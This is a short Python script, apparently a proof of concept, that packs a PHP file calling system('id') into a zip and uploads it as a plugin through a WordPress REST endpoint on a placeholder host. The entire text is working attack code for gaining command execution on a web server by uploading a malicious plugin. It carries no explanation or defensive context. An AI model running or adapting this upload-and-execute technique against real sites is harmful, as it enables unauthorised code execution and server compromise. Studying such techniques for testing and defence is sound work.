import io
import zipfile
import requests
PAYLOAD = '<?php @system("id"); ?>'
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("helper/entry.php", PAYLOAD)
requests.post("https://example.invalid/wp-json/wp/v2/plugins", files={"plugin": ("helper.zip", buf.getvalue())})
